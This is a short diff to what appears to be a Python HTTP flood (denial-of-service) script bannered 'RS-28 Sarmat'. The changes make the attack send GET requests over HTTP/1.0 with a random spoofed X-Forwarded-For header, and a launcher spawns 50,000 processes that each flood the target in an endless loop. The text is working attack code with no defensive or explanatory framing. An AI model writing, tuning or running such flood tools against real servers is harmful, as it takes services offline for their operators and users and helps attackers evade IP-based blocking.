@@ -55,7 +55,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD "  + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "GET "  + url + " HTTP/1.0\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
@@ -77,11 +77,11 @@ print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
 	
-def send3attack():
+def send2attack():
   for i in range(50000): #Poder mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
 
     
-send3attack()
+send2attack()
